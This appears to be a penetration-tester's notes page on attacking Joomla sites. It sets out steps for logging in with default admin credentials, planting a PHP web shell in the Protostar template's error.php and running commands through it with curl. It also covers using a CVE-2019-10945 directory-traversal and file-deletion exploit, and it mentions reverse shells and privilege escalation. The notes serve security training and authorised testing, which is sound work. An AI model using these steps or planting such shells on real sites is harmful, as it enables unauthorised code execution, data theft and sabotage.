## Joomla – Attacking
### Objective

- Achieve Remote Code Execution via:    
    - Admin Panel access (template edit)
    - Core vulnerability (CVE-2019-10945)        
- Perform post-exploitation (reverse shell, cleanup, LPE)
### 1. Gaining Access via Admin Panel
#### Credentials (from previous enum):

```
Username: admin
Password: admin
```
#### Login Portal:

```http
http://<target>/administrator
```
#### Fix UI Error (if present):

- If control panel breaks with:  
    `Call to a member function format() on null`  
    → Disable `Quick Icon - PHP Version Check` plugin at:

```http
   /administrator/index.php?option=com_plugins
```
### 2. Template Injection for RCE

#### Navigation Steps:

- Go to:    

```
Configuration → Templates
```

- Choose template: Protostar    
- Select file: error.php
- Inject:

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```    
#### Save and Execute:

```bash
curl -s http://<target>/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
#### Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### Post-Exploitation:

- Spawn reverse shell    
- Enumerate internal network / escalate privileges
- Cleanup: remove shell code and log filename, hash, path in report
### 3. CVE-2019-10945 – Directory Traversal + File Deletion
#### Target Version:

- Joomla 1.5.0 → 3.9.4    
- Your version: 3.9.4
#### Exploit Capability:

- List files in arbitrary directories    
- Delete files (optional/dangerous)
#### Usage:

```bash
python2.7 joomla_dir_trav.py \
--url "http://<target>/administrator/" \
--username admin \
--password admin \
--dir /
```
#### Output Example:

```
administrator
bin
cache
components
configuration.php
index.php
robots.txt
...
```
#### Notes:

- Authenticated RCE is already easier if backend is exposed    
- Use this only if `/administrator/` is blocked externally
- Can be used to locate config files, credentials, or pivot paths
### 4. Cleanup & Reporting

ALWAYS log:

- Shell filename, file hash, full path
- Time of access/modification
- Accounts used (e.g., `admin`)
- Tools used (e.g., `joomla_dir_trav.py`)
- Any deleted/modified file paths    
### Summary of Exploitation Paths

| Technique             | Description                                       | Notes                              |
| --------------------- | ------------------------------------------------- | ---------------------------------- |
| Admin Panel Injection | Modify error.php with `system($_GET[...])`        | Reliable                           |
| CVE-2019-10945        | Authenticated Directory Traversal / File Deletion | Useful for info access or sabotage |
| Reverse Shell         | Via template-based RCE                            | Enables internal recon             |
| Cleanup               | Remove shells, log artifacts                      | Required for responsible testing   |
# Tags
> #Exploitation #Application-Exploitation #Joomla 